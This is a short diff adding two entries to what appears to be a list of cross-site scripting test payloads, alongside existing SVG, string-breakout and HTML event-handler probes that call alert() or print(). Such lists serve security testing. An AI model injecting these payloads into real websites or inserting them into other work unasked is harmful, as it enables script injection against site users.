@@ -39,3 +39,5 @@ poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)
 ';alert(gotcha); //
 <body onmouseover="print()">
 <body onclick=print()>
+<body onmessage=print()>
+<iframe onload=print()></iframe>
